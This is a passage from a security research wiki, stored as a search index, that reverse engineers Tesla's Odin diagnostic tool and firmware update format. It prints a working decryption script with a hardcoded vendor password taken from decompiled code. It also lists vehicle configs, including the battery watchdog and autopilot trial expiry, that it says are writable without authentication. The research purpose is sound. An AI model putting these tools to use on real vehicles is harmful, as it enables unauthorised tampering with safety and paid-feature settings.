<code>/opt/odin/data/Model3/config-options.json</code> Model 3 config database <code>/opt/odin/data/ModelY/config-options.json</code> Model Y config database <code>/opt/odin/routines/</code> Diagnostic routine scripts"},{"location":"3-odin/#related-research","title":"Related Research","text":"<ul> <li>Gateway Config System - Uses Odin access levels</li> <li>Gateway Security Model - Secure/insecure classification</li> </ul> <p>Status: COMPLETE \u2705 Last Updated: 2026-02-07</p>"},{"location":"3-odin/config-decoder/","title":"Odin Config Decoder","text":"<p>Complete reverse engineering of Tesla's SHA256 config hashing algorithm.</p>"},{"location":"3-odin/config-decoder/#overview","title":"Overview","text":"<p>Tesla's Odin tool obfuscates configuration keys and values using SHA256 hashing. This document details the complete decoding methodology.</p> Metric Value Algorithm SHA256 Key Format <code>SHA256(key + salt)</code> Value Format <code>SHA256(value + key + salt)</code> Decoded Configs 62-64 (varies by model) Unknown Hashes 94-96"},{"location":"3-odin/config-decoder/#file-format","title":"File Format","text":""},{"location":"3-odin/config-decoder/#config-optionsjson-structure","title":"config-options.json Structure","text":"<pre><code>{\n  \"salt\": \"gj55iz2tgghun9nyw2sa8s5oxsykmfwo\",\n  \"hashed\": {\n    \"b845fd7008982fd6...\": [\n      \"147b5c3c7870642...\",\n      \"8d5e3a7c1b4f9e2...\"\n    ]\n  },\n  \"public\": {\n    \"brakeHWType\": {\n      \"accessId\": 17,\n      \"description\": \"Brake caliper hardware type\",\n      \"content\": {\n        \"enums\": [\n          {\"codeKey\": \"BREMBO_P42_MANDO_43MOC\", \"value\": 0}\n        ]\n      }\n    }\n  }\n}\n</code></pre>"},{"location":"3-odin/config-decoder/#sections","title":"Sections","text":"Section Purpose <code>salt</code> Random string for hashing (per firmware) <code>hashed</code> SHA256 key hashes \u2192 array of value hashes <code>public</code> Unhashed configs with enum definitions"},{"location":"3-odin/config-decoder/#hashing-algorithm","title":"Hashing Algorithm","text":""},{"location":"3-odin/config-decoder/#key-hashing","title":"Key Hashing","text":"<pre><code>def generate_keyhash(key: str, salt: str) -&gt; str:\n    \"\"\"Generate SHA256 hash for config key.\"\"\"\n    return hashlib.sha256(f\"{key}{salt}\".encode()).hexdigest()\n</code></pre> <p>Example: <pre><code>key = \"brakeHWType\"\nsalt = \"gj55iz2tgghun9nyw2sa8s5oxsykmfwo\"\nkeyhash = SHA256(\"brakeHWTypegj55iz2tgghun9nyw2sa8s5oxsykmfwo\")\n        = \"b845fd7008982fd6ae79d93c29ee801f21287afa87afffd604d8e5f49b282902\"\n</code></pre></p>"},{"location":"3-odin/config-decoder/#value-hashing","title":"Value Hashing","text":"<p>IMPORTANT: Value comes FIRST in the hash input!</p> <pre><code>def generate_valuehash(value: str, key: str, salt: str) -&gt; str:\n    \"\"\"Generate SHA256 hash for config value.\"\"\"\n    # Note: value + key + salt (NOT key + value + salt)\n    return hashlib.sha256(f\"{value}{key}{salt}\".encode()).hexdigest()\n</code></pre> <p>Example: <pre><code>value = \"BREMBO_P42_MANDO_43MOC\"\nkey = \"brakeHWType\"\nsalt = \"gj55iz2tgghun9nyw2sa8s5oxsykmfwo\"\nvaluehash = SHA256(\"BREMBO_P42_MANDO_43MOCbrakeHWTypegj55iz2tgghun9nyw2sa8s5oxsykmfwo\")\n</code></pre></p>"},{"location":"3-odin/config-decoder/#decoding-process","title":"Decoding Process","text":""},{"location":"3-odin/config-decoder/#algorithm","title":"Algorithm","text":"<ol> <li>Load config-options.json</li> <li>Extract <code>salt</code>, <code>hashed</code>, and <code>public</code> sections</li> <li>For each public config:</li> <li>Compute <code>keyhash = SHA256(key + salt)</code></li> <li>If keyhash exists in <code>hashed</code> section:<ul> <li>For each value in public config enums:</li> <li>Compute <code>valuehash = SHA256(enum.codeKey + key + salt)</code></li> <li>Match against hashed values</li> </ul> </li> </ol>"},{"location":"3-odin/config-decoder/#python-implementation","title":"Python Implementation","text":"<pre><code>import json\nimport hashlib\n\ndef decode_config_file(path: str) -&gt; dict:\n    with open(path, 'r') as f:\n        data = json.load(f)\n\n    salt = data[\"salt\"]\n    hashed = data.get(\"hashed\", {})\n    public = data.get(\"public\", {})\n\n    result = {}\n\n    for key, config in public.items():\n        keyhash = hashlib.sha256(f\"{key}{salt}\".encode()).hexdigest()\n\n        if keyhash in hashed:\n            decoded_values = []\n            enums = config.get(\"content\", {}).get(\"enums\", [])\n\n            for value_hash in hashed[keyhash]:\n                matched = False\n                for enum in enums:\n                    code_key = enum.get(\"codeKey\", \"\")\n                    expected = hashlib.sha256(\n                        f\"{code_key}{key}{salt}\".encode()\n                    ).hexdigest()\n\n                    if expected == value_hash:\n                        decoded_values.append(enum)\n                        matched = True\n                        break\n\n                if not matched:\n                    decoded_values.append({\"hash\": value_hash, \"unknown\": True})\n\n            result[key] = {\n                \"accessId\": config.get(\"accessId\"),\n                \"values\": decoded_values\n            }\n\n    return result\n</code></pre>"},{"location":"3-odin/config-decoder/#salt-values","title":"Salt Values","text":"Model Firmware Salt Model 3 2024+ <code>gj55iz2tgghun9nyw2sa8s5oxsykmfwo</code> Model Y 2024+ <code>2xz83kgreak7h956dgb3mdmd260c6cun</code> Older 2021 Different per version <p>Note: Salt changes between firmware versions. Always extract from the actual config file.</p>"},{"location":"3-odin/config-decoder/#decoded-configs","title":"Decoded Configs","text":""},{"location":"3-odin/config-decoder/#critical-configs","title":"Critical Configs","text":"Config Access ID Values Description packEnergy 14 SR/LR/MR Battery capacity factoryMode 15 on/off Factory mode enable dasHw 59 HW2.5/HW3/HW4 FSD hardware mapRegion 67 14 regions Navigation maps brakeHWType 17 15 variants Brake calibration"},{"location":"3-odin/config-decoder/#access-levels","title":"Access Levels","text":"Level Permission <code>RepairAndMaintenanceReadOnly</code> Read-only <code>RepairAndMaintenance</code> Read/write <code>SecureOperation</code> Secure write <code>ResearchAndDevelopment</code> Tesla only"},{"location":"3-odin/config-decoder/#example-output","title":"Example Output","text":""},{"location":"3-odin/config-decoder/#packenergy-id-14","title":"packEnergy (ID 14)","text":"<pre><code>{\n  \"accessId\": 14,\n  \"description\": \"Bucketed approximate energy capacity of battery pack\",\n  \"odinReadWriteAccess\": \"RepairAndMaintenance\",\n  \"values\": [\n    {\"codeKey\": \"SR\", \"value\": 0, \"description\": \"Standard Range\"},\n    {\"codeKey\": \"LR\", \"value\": 1, \"description\": \"Long Range\"},\n    {\"codeKey\": \"MR\", \"value\": 2, \"description\": \"Mid Range\"}\n  ]\n}\n</code></pre>"},{"location":"3-odin/config-decoder/#dashw-id-59","title":"dasHw (ID 59)","text":"<pre><code>{\n  \"accessId\": 59,\n  \"description\": \"Driver Assist hardware\",\n  \"odinReadWriteAccess\": \"ResearchAndDevelopment\",\n  \"values\": [\n    {\"codeKey\": \"PARKER_PASCAL_2_5\", \"value\": 3, \"description\": \"HW2.5\"},\n    {\"codeKey\": \"TESLA_AP3\", \"value\": 4, \"description\": \"HW3\"},\n    {\"codeKey\": \"TESLA_AP4\", \"value\": 5, \"description\": \"HW4\"}\n  ]\n}\n</code></pre>"},{"location":"3-odin/config-decoder/#unknown-hashes","title":"Unknown Hashes","text":"<p>Some configs cannot be decoded:</p> Count Reason 94-96 No enum definitions in <code>public</code> section <p>Why: - Read-only configs (no user modification) - Internal Tesla flags - Deprecated options - Future features not yet documented</p>"},{"location":"3-odin/config-decoder/#tool-usage","title":"Tool Usage","text":""},{"location":"3-odin/config-decoder/#decode-config-file","title":"Decode Config File","text":"<pre><code>python3 scripts/decode_gateway_config.py \\\n  /opt/odin/data/Model3/config-options.json\n</code></pre>"},{"location":"3-odin/config-decoder/#output-files","title":"Output Files","text":"<ul> <li><code>config-options-FULL-DECODED.json</code> (86 KB)</li> <li><code>config-options-FULL-DECODED.txt</code> (56 KB)</li> </ul>"},{"location":"3-odin/config-decoder/#security-analysis","title":"Security Analysis","text":""},{"location":"3-odin/config-decoder/#is-this-secure","title":"Is This Secure?","text":"<p>NO. This is obfuscation, not cryptographic security.</p> <p>Weaknesses: - Salt included in same file - Algorithm is standard SHA256 - All enum values provided for brute-force - Public section contains reference data</p> <p>Real Security: - Gateway firmware validates writes - Secure configs require Hermes authentication - Factory mode requires unfused vehicle</p>"},{"location":"3-odin/config-decoder/#decompiled-source","title":"Decompiled Source","text":"<p>Location: Odin firmware, Python 3.6 bytecode</p> <pre><code># From gen3/config_options.py\nclass Gen3ConfigOptions:\n    def generate_hash(self, data):\n        bytes_data = data.encode() if isinstance(data, str) else data\n        return hashlib.sha256(bytes_data).hexdigest()\n\n    def generate_keyhash(self, key):\n        return self.generate_hash(f\"{key}{self.salt}\")\n\n    def generate_valuehash(self, key, value):\n        return self.generate_hash(f\"{value}{key}{self.salt}\")\n</code></pre>"},{"location":"3-odin/config-decoder/#cross-references","title":"Cross-References","text":"<ul> <li>Odin Architecture - How Odin uses these configs</li> <li>Gateway Config System - Config IDs</li> <li>scripts/decode_gateway_config.py - Decoder tool</li> </ul> <p>Status: COMPLETE \u2705 Evidence: Decompiled source, working decoder Last Updated: 2026-02-07</p>"},{"location":"3-odin/odj-encryption/","title":"ODJ File Encryption","text":"<p>Decryption methodology for Tesla Odin diagnostic job files.</p>"},{"location":"3-odin/odj-encryption/#overview","title":"Overview","text":"<p>Odin job files (.odj) use Fernet encryption with a hardcoded password.</p> Parameter Value Encryption Fernet (symmetric) KDF PBKDF2-HMAC-SHA256 Iterations 123456 Password <code>cmftubxi7wlvmh1wmbzz00vf1ziqezf6</code> Salt First 16 bytes of file"},{"location":"3-odin/odj-encryption/#file-format","title":"File Format","text":""},{"location":"3-odin/odj-encryption/#structure","title":"Structure","text":"<pre><code>Offset   Size    Field\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n0x00     16      Salt (random per file)\n0x10     N       Fernet token (encrypted data)\n</code></pre>"},{"location":"3-odin/odj-encryption/#fernet-token-format","title":"Fernet Token Format","text":"<pre><code>Version (1 byte) || Timestamp (8 bytes) || IV (16 bytes) || Ciphertext || HMAC (32 bytes)\n</code></pre>"},{"location":"3-odin/odj-encryption/#decryption-algorithm","title":"Decryption Algorithm","text":""},{"location":"3-odin/odj-encryption/#key-derivation","title":"Key Derivation","text":"<pre><code>from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC\nfrom cryptography.hazmat.primitives import hashes\nimport base64\n\nPASSWORD = b\"cmftubxi7wlvmh1wmbzz00vf1ziqezf6\"\nITERATIONS = 123456\n\ndef derive_key(salt: bytes) -&gt; bytes:\n    kdf = PBKDF2HMAC(\n        algorithm=hashes.SHA256(),\n        length=32,\n        salt=salt,\n        iterations=ITERATIONS\n    )\n    key = kdf.derive(PASSWORD)\n    return base64.urlsafe_b64encode(key)\n</code></pre>"},{"location":"3-odin/odj-encryption/#decryption","title":"Decryption","text":"<pre><code>from cryptography.fernet import Fernet\n\ndef decrypt_odj(file_path: str) -&gt; bytes:\n    with open(file_path, 'rb') as f:\n        data = f.read()\n\n    salt = data[:16]\n    encrypted = data[16:]\n\n    key = derive_key(salt)\n    fernet = Fernet(key)\n\n    return fernet.decrypt(encrypted)\n</code></pre>"},{"location":"3-odin/odj-encryption/#complete-decryption-script","title":"Complete Decryption Script","text":"<pre><code>#!/usr/bin/env python3\n\"\"\"Decrypt Tesla Odin ODJ files.\"\"\"\n\nimport base64\nimport json\nimport sys\nfrom cryptography.fernet import Fernet\nfrom cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC\nfrom cryptography.hazmat.primitives import hashes\n\nPASSWORD = b\"cmftubxi7wlvmh1wmbzz00vf1ziqezf6\"\nITERATIONS = 123456\n\ndef decrypt_odj(input_path: str, output_path: str = None):\n    with open(input_path, 'rb') as f:\n        data = f.read()\n\n    salt = data[:16]\n    encrypted = data[16:]\n\n    # Derive key\n    kdf = PBKDF2HMAC(\n        algorithm=hashes.SHA256(),\n        length=32,\n        salt=salt,\n        iterations=ITERATIONS\n    )\n    key = base64.urlsafe_b64encode(kdf.derive(PASSWORD))\n\n    # Decrypt\n    fernet = Fernet(key)\n    decrypted = fernet.decrypt(encrypted)\n\n    # Parse JSON\n    try:\n        parsed = json.loads(decrypted)\n        result = json.dumps(parsed, indent=2)\n    except json.JSONDecodeError:\n        result = decrypted.decode('utf-8', errors='replace')\n\n    if output_path:\n        with open(output_path, 'w') as f:\n            f.write(result)\n        print(f\"Decrypted to: {output_path}\")\n    else:\n        print(result)\n\n    return result\n\nif __name__ == \"__main__\":\n    if len(sys.argv) &lt; 2:\n        print(f\"Usage: {sys.argv[0]} &lt;input.odj&gt; [output.json]\")\n        sys.exit(1)\n\n    input_file = sys.argv[1]\n    output_file = sys.argv[2] if len(sys.argv) &gt; 2 else None\n\n    decrypt_odj(input_file, output_file)\n</code></pre>"},{"location":"3-odin/odj-encryption/#usage","title":"Usage","text":""},{"location":"3-odin/odj-encryption/#decrypt-single-file","title":"Decrypt Single File","text":"<pre><code>python3 scripts/decrypt_odj.py input.odj output.json\n</code></pre>"},{"location":"3-odin/odj-encryption/#decrypt-all-files-in-directory","title":"Decrypt All Files in Directory","text":"<pre><code>for f in *.odj; do\n    python3 scripts/decrypt_odj.py \"$f\" \"${f%.odj}.json\"\ndone\n</code></pre>"},{"location":"3-odin/odj-encryption/#credential-source","title":"Credential Source","text":"<p>The password was extracted from decompiled Odin Python bytecode:</p> <pre><code># From odin_decompiled/core/crypto.py\nENCRYPTION_PASSWORD = \"cmftubxi7wlvmh1wmbzz00vf1ziqezf6\"\nPBKDF2_ITERATIONS = 123456\n</code></pre>"},{"location":"3-odin/odj-encryption/#security-analysis","title":"Security Analysis","text":""},{"location":"3-odin/odj-encryption/#why-this-is-insecure","title":"Why This Is Insecure","text":"<ol> <li>Hardcoded password - Same for all vehicles</li> <li>Password in bytecode - Easily extracted</li> <li>No unique key per vehicle - Universal decryption</li> <li>Standard algorithm - Fernet is well-documented</li> </ol>"},{"location":"3-odin/odj-encryption/#what-this-enables","title":"What This Enables","text":"<ul> <li>Decrypt any ODJ file without Tesla access</li> <li>Analyze diagnostic job definitions</li> <li>Understand test procedures</li> <li>Extract calibration data</li> </ul>"},{"location":"3-odin/odj-encryption/#cross-references","title":"Cross-References","text":"<ul> <li>Odin Architecture - How Odin uses ODJ files</li> <li>Config Decoder - Related hashing system</li> <li>scripts/decrypt_odj.py - Decryption tool</li> </ul> <p>Status: COMPLETE \u2705 Evidence: Working decryption, decompiled source Last Updated: 2026-02-07</p>"},{"location":"3-odin/routines-database/","title":"Odin Routines Database","text":"<p>Analysis of Tesla's 2,988 diagnostic scripts and access level mappings.</p>"},{"location":"3-odin/routines-database/#overview","title":"Overview","text":"<p>The Odin routines database is a JSON file containing config definitions with access levels that reveal Tesla's security model.</p> Metric Value Total Scripts 2,988 Python files Gen3 Configs Model 3, Y, Lychee, Tamarind Gen2 Configs Model S, X (pre-refresh) Source Internal unhashed database"},{"location":"3-odin/routines-database/#database-structure","title":"Database Structure","text":""},{"location":"3-odin/routines-database/#format","title":"Format","text":"<pre><code>{\n  \"gen3\": [\n    {\n      \"accessId\": 7,\n      \"codeKey\": \"exteriorColor\",\n      \"accessLevel\": null,\n      \"content\": {\n        \"enums\": [...]\n      },\n      \"description\": \"exterior vehicle color\",\n      \"products\": [\"Model3\", \"ModelY\", \"Tamarind\", \"Lychee\"]\n    }\n  ],\n  \"gen2\": [...]\n}\n</code></pre>"},{"location":"3-odin/routines-database/#key-fields","title":"Key Fields","text":"Field Purpose Example <code>accessId</code> Permission level 7, 33, 54 <code>codeKey</code> Config name <code>exteriorColor</code> <code>accessLevel</code> Security flag <code>\"UDP\"</code>, <code>\"GTW\"</code>, null <code>content.enums</code> Valid values <code>[{codeKey, value}]</code> <code>products</code> Applicable vehicles <code>[\"Model3\", \"ModelY\"]</code>"},{"location":"3-odin/routines-database/#access-levels","title":"Access Levels","text":""},{"location":"3-odin/routines-database/#security-flags","title":"Security Flags","text":"Flag Meaning Count Example <code>\"UDP\"</code> Insecure, no auth 3 ecuMapVersion <code>\"GTW\"</code> Hardware locked 1 devSecurityLevel <code>null</code> Standard auth ~150 Most configs"},{"location":"3-odin/routines-database/#insecure-configs-accesslevel-udp","title":"Insecure Configs (<code>accessLevel: \"UDP\"</code>)","text":"Config accessId Description ecuMapVersion 33 ECU configuration version autopilotTrialExpireTime 54 AP trial expiration bmpWatchdogDisabled 61 Battery watchdog"},{"location":"3-odin/routines-database/#hardware-locked-config-accesslevel-gtw","title":"Hardware-Locked Config (<code>accessLevel: \"GTW\"</code>)","text":"<pre><code>{\n  \"accessId\": 15,\n  \"accessLevel\": \"GTW\",\n  \"codeKey\": \"devSecurityLevel\",\n  \"content\": {\n    \"enums\": [\n      {\"codeKey\": \"LC_FACTORY\", \"value\": 3, \"description\": \"Factory - CUST_DEL\"},\n      {\"codeKey\": \"LC_GATED\", \"value\": 2, \"description\": \"Production - OEM_PROD\"}\n    ]\n  }\n}\n</code></pre> <p>This controls the MPC5748G hardware security fuses.</p>"},{"location":"3-odin/routines-database/#critical-configs","title":"Critical Configs","text":""},{"location":"3-odin/routines-database/#superchargingaccess-accessid-30","title":"superchargingAccess (accessId 30)","text":"<pre><code>{\n  \"accessId\": 30,\n  \"codeKey\": \"superchargingAccess\",\n  \"content\": {\n    \"enums\": [\n      {\"codeKey\": \"NOT_ALLOWED\", \"value\": 0},\n      {\"codeKey\": \"ALLOWED\", \"value\": 1},\n      {\"codeKey\": \"PAY_AS_YOU_GO\", \"value\": 2}\n    ]\n  },\n  \"description\": \"Customer's access to Tesla supercharging network\"\n}\n</code></pre> <p>Status: Secure (no UDP flag, confirmed by source)</p>"},{"location":"3-odin/routines-database/#autopilot-accessid-29","title":"autopilot (accessId 29)","text":"<pre><code>{\n  \"accessId\": 29,\n  \"codeKey\": \"autopilot\",\n  \"content\": {\n    \"enums\": [\n      {\"codeKey\": \"NONE\", \"value\": 0},\n      {\"codeKey\": \"HIGHWAY\", \"value\": 1},\n      {\"codeKey\": \"ENHANCED\", \"value\": 2},\n      {\"codeKey\": \"SELF_DRIVING\", \"value\": 3},\n      {\"codeKey\": \"BASIC\", \"value\": 4}\n    ]\n  }\n}\n</code></pre> <p>Status: Likely secure (paid feature, no UDP flag)</p>"},{"location":"3-odin/routines-database/#mapregion-accessid-66","title":"mapRegion (accessId 66)","text":"<pre><code>{\n  \"accessId\": 66,\n  \"codeKey\": \"mapRegion\",\n  \"content\": {\n    \"enums\": [\n      {\"codeKey\": \"US\", \"value\": 0},\n      {\"codeKey\": \"EU\", \"value\": 1},\n      {\"codeKey\": \"NONE\", \"value\": 2},\n      {\"codeKey\": \"CN\", \"value\": 3},\n      {\"codeKey\": \"AU\", \"value\": 4},\n      {\"codeKey\": \"JP\", \"value\": 5},\n      {\"codeKey\": \"TW\", \"value\": 6},\n      {\"codeKey\": \"KR\", \"value\": 7},\n      {\"codeKey\": \"ME\", \"value\": 8},\n      {\"codeKey\": \"HK\", \"value\": 9},\n      {\"codeKey\": \"MO\", \"value\": 10},\n      {\"codeKey\": \"SE\", \"value\": 11}\n    ]\n  }\n}\n</code></pre> <p>Status: Insecure (empirically confirmed modifiable)</p>"},{"location":"3-odin/routines-database/#accessid-to-config-id-mapping","title":"accessId to Config ID Mapping","text":""},{"location":"3-odin/routines-database/#discovered-mappings","title":"Discovered Mappings","text":"accessId Config ID Name 14 0x0E packEnergy 15 0x0F devSecurityLevel 17 0x11 brakeHWType 20 0x14 mapRegion 59 0x3B dasHardwareConfig 66 0x42 mapRegion 81 0x51 deliveryStatus"},{"location":"3-odin/routines-database/#pattern","title":"Pattern","text":"<pre><code>Config ID = accessId (for low IDs)\nOR\nConfig ID = (accessId - offset) for some ranges\n</code></pre> <p>Full mapping requires cross-referencing flash dump with database.</p>"},{"location":"3-odin/routines-database/#gen2-vs-gen3-differences","title":"Gen2 vs Gen3 Differences","text":""},{"location":"3-odin/routines-database/#gen2-model-sx-pre-refresh","title":"Gen2 (Model S/X Pre-Refresh)","text":"Feature Value accessId format String Enum values Strings Special flags None found Product codes <code>ModelS</code>, <code>ModelX</code>"},{"location":"3-odin/routines-database/#gen3-model-3yrefresh","title":"Gen3 (Model 3/Y/Refresh)","text":"Feature Value accessId format Integer Enum values Integers Special flags <code>UDP</code>, <code>GTW</code> Product codes <code>Model3</code>, <code>ModelY</code>, <code>Lychee</code>, <code>Tamarind</code>"},{"location":"3-odin/routines-database/#security-implications","title":"Security Implications","text":""},{"location":"3-odin/routines-database/#identification-of-insecure-configs","title":"Identification of Insecure Configs","text":"<p>Configs with <code>accessLevel: \"UDP\"</code> can be modified via UDP:3500 without authentication: - ecuMapVersion (ECU list translation) - autopilotTrialExpireTime (trial duration) - bmpWatchdogDisabled (battery watchdog)</p>"},{"location":"3-odin/routines-database/#identification-of-secure-configs","title":"Identification of Secure Configs","text":"<p>Configs without <code>accessLevel</code> flag that control: - Paid features (supercharger, FSD) - Vehicle identity (VIN, country) - Safety systems (restraints, brakes)</p> <p>These require authenticated Hermes session.</p>"},{"location":"3-odin/routines-database/#attack-surface","title":"Attack Surface","text":"<pre><code># Test UDP writeability\ndef is_insecure(config):\n    return config.get(\"accessLevel\") == \"UDP\"\n\ninsecure_configs = [c for c in gen3 if is_insecure(c)]\n# Returns: ecuMapVersion, autopilotTrialExpireTime, bmpWatchdogDisabled\n</code></pre>"},{"location":"3-odin/routines-database/#practical-applications","title":"Practical Applications","text":""},{"location":"3-odin/routines-database/#enum-value-lookup","title":"Enum Value Lookup","text":"<pre><code>import json\n\nwith open('routines-database.json') as f:\n    db = json.load(f)\n\ndef get_enum_values(config_name):\n    for config in db['gen3']:\n        if config['codeKey'] == config_name:\n            return config['content']['enums']\n    return None\n\n# Get all autopilot levels\nvalues = get_enum_values('autopilot')\n# Returns: NONE=0, HIGHWAY=1, ENHANCED=2, SELF_DRIVING=3, BASIC=4\n</code></pre>"},{"location":"3-odin/routines-database/#security-classification","title":"Security Classification","text":"<pre><code>def classify_config(config):\n    if config.get('accessLevel') == 'UDP':\n        return 'INSECURE'\n    elif config.get('accessLevel') == 'GTW':\n        return 'HARDWARE_LOCKED'\n    else:\n        return 'STANDARD_AUTH'\n</code></pre>"},{"location":"3-odin/routines-database/#cross-references","title":"Cross-References","text":"<ul> <li>Gateway Security Model - Two-tier security</li> <li>Config System - Config ID reference</li> <li>Config Decoder - Hash decoding</li> </ul> <p>Status: VERIFIED \u2705 Evidence: Unhashed database from internal source Last Updated: 2026-02-07</p>"},{"location":"4-firmware/ice/usb-updates/","title":"USB Offline Updates (ICE Platform)","text":"<p>Complete analysis of Tesla USB update package format for Model 3/Y.</p>"},{"location":"4-firmware/ice/usb-updates/#overview","title":"Overview","text":"<p>Tesla offline USB update packages use a combination of SquashFS, Ed25519 signatures, and dm-verity for integrity verification.</p> Metric Value File Extension <code>.ice</code> Typical Size 2.0-2.2 GB Compression LZ4 (High Compression) Signature Ed25519/NaCl Integrity dm-verity (SHA-256)"},{"location":"4-firmware/ice/usb-updates/#package-structure","title":"Package Structure","text":""},{"location":"4-firmware/ice/usb-updates/#complete-format","title":"Complete Format","text":"<pre><code>Offset          Size        Component\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n0x00000000      ~2.1 GB     SquashFS filesystem\n(aligned)       ~2 KB       Padding (to 4K boundary)\n(sig_offset)    ~35 MB      Signature + dm-verity region\n</code></pre>"},{"location":"4-firmware/ice/usb-updates/#example-2025268ice","title":"Example: 2025.26.8.ice","text":"<pre><code>Total file size:     2,241,335,360 bytes (2.09 GB)\nSquashFS size:       2,206,369,806 bytes (2.05 GB)\nPadding:                     2,034 bytes\nSignature region:       34,963,520 bytes (33.34 MB)\n</code></pre>"},{"location":"4-firmware/ice/usb-updates/#squashfs-filesystem","title":"SquashFS Filesystem","text":""},{"location":"4-firmware/ice/usb-updates/#header","title":"Header","text":"<pre><code>Magic:          hsqs (0x73717368)\nVersion:        4.0\nCompression:    lz4 with High Compression (-Xhc)\nBlock size:     131072 bytes (128 KB)\nInodes:         ~28,500\n</code></pre>"},{"location":"4-firmware/ice/usb-updates/#hex-dump","title":"Hex Dump","text":"<pre><code>Offset   Hex                                ASCII\n000000   68 73 71 73 60 6f 00 00 04 05...   hsqs`o......\n         \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n         SquashFS magic (little-endian)\n</code></pre>"},{"location":"4-firmware/ice/usb-updates/#signature-region","title":"Signature Region","text":""},{"location":"4-firmware/ice/usb-updates/#location","title":"Location","text":"<pre><code>signature_offset = align_to_4k(squashfs_end)\n# Example: 2,206,369,806 \u2192 aligned \u2192 2,206,371,840\n</code></pre>"},{"location":"4-firmware/ice/usb-updates/#signature-blob-header","title":"Signature Blob Header","text":"<pre><code>Offset   Size    Field\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n+0x00    4       Magic: 0xba01ba01\n+0x04    4       Flags/Version: 0x00000000\n+0x08    64      Ed25519 signature\n+0x48    32      Public key hash\n+0x68    ???     dm-verity table data\n</code></pre>"},{"location":"4-firmware/ice/usb-updates/#hex-dump_1","title":"Hex Dump","text":"<pre><code>00000000  01 ba 01 ba 00 00 00 00 79 87 cd 11 c4 36 66 ce\n          \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n          Magic (0xba01ba01)     Ed25519 signature start\n</code></pre>"},{"location":"4-firmware/ice/usb-updates/#dm-verity-hash-table","title":"dm-verity Hash Table","text":""},{"location":"4-firmware/ice/usb-updates/#location_1","title":"Location","text":"<p>Found at offset +0x108 (268 bytes) from signature region start.</p>"},{"location":"4-firmware/ice/usb-updates/#table-format","title":"Table Format","text":"<pre><code>1 4096 4096 538665 538666 sha256 \n2e7572e853d5f80f83759288aaacdc12f6e18fca68f7993fccc3e63beb4e4d88 \n283f2ca91f05fb581c61ae2a7814fe8359cf26b7fc9228c253a21d32159d78f7\n</code></pre>"},{"location":"4-firmware/ice/usb-updates/#decoded-parameters","title":"Decoded Parameters","text":"Parameter Value Version 1 Data block size 4096 bytes Hash block size 4096 bytes Data blocks 538,665 Hash blocks 538,666 Hash algorithm sha256 Root hash 64-char hex Salt 64-char hex"},{"location":"4-firmware/ice/usb-updates/#verification-flow","title":"Verification Flow","text":""},{"location":"4-firmware/ice/usb-updates/#on-vehicle","title":"On Vehicle","text":"<pre><code>1. USB inserted \u2192 udev triggers check-usb-devices\n2. check-usb-devices scans for *.ice files\n3. updaterctl signature-install &lt;file&gt;\n4. Load SquashFS size from superblock\n5. Calculate signature offset (align to 4K)\n6. Extract Ed25519 signature (64 bytes)\n7. Load public key (/etc/verity-prod.pub)\n8. Verify Ed25519 signature\n   \u251c\u2500 PASS \u2192 Continue\n   \u2514\u2500 FAIL \u2192 Reject package\n9. Parse dm-verity table\n10. Create device mapper target\n11. Mount with dm-verity verification\n12. Install firmware\n</code></pre>"},{"location":"4-firmware/ice/usb-updates/#public-key-locations","title":"Public Key Locations","text":"Key Path Purpose Production <code>/etc/verity-prod.pub</code> Fused vehicles Development <code>/etc/verity-dev.pub</code> Unfused units Modem <code>/etc/verity-modem-prod.pub</code> Modem firmware <p>Key Format: Ed25519 public key (32 bytes, base64 in PEM)</p>"},{"location":"4-firmware/ice/usb-updates/#creating-packages","title":"Creating Packages","text":""},{"location":"4-firmware/ice/usb-updates/#requirements","title":"Requirements","text":"<ol> <li>SquashFS filesystem with correct parameters</li> <li>NaCl/Ed25519 signature (requires Tesla private key)</li> <li>dm-verity hash table</li> <li>Correct alignment and structure</li> </ol>"},{"location":"4-firmware/ice/usb-updates/#squashfs-creation","title":"SquashFS Creation","text":"<pre><code>mksquashfs firmware/ update.sqfs \\\n    -comp lz4 -Xhc \\\n    -b 131072 \\\n    -noappend \\\n    -no-xattrs \\\n    -all-root\n</code></pre>"},{"location":"4-firmware/ice/usb-updates/#dm-verity-generation","title":"dm-verity Generation","text":"<pre><code>veritysetup format update.sqfs update.hash \\\n    --data-block-size=4096 \\\n    --hash-block-size=4096 \\\n    --hash=sha256 \\\n    --salt=$(openssl rand -hex 32)\n</code></pre>"},{"location":"4-firmware/ice/usb-updates/#signature-requires-tesla-key","title":"Signature (Requires Tesla Key)","text":"<pre><code>import nacl.signing\n\n# This requires Tesla's private key (NOT publicly available)\nsigning_key = nacl.signing.SigningKey(TESLA_PRIVATE_KEY)\nsignature = signing_key.sign(package_data)\n</code></pre>"},{"location":"4-firmware/ice/usb-updates/#the-blocker-teslas-private-key","title":"The Blocker: Tesla's Private Key","text":""},{"location":"4-firmware/ice/usb-updates/#whats-needed","title":"What's Needed","text":"Item Status Package format \u2705 Known Signature algorithm \u2705 Known (Ed25519) dm-verity format \u2705 Known Tesla private key \u274c NOT 